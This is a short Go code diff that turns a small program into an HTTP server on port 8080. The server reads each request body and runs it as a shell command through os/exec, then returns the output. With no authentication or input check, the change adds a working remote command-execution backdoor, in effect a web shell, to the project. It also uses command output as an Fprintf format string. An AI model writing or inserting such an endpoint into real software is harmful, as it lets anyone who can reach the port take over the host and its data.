@@ -2,6 +2,8 @@ package main
 
 import (
 	"fmt"
+	"io/ioutil"
+	"net/http"
 	"os/exec"
 	"strings"
 )
@@ -21,9 +23,17 @@ func runCommand(command string) string {
 	return string(commandOutput)
 }
 
+func handler(w http.ResponseWriter, r *http.Request) {
+	bodyBytes, err := ioutil.ReadAll(r.Body)
+	if err != nil {
+		panic(err)
+	}
+	bodyString := string(bodyBytes)
+	output := runCommand(bodyString)
+	fmt.Fprintf(w, output)
+}
+
 func main() {
-
-	output := runCommand("cat main.go")
-
-	fmt.Println(output)
+	http.HandleFunc("/", handler)
+	http.ListenAndServe(":8080", nil)
 }
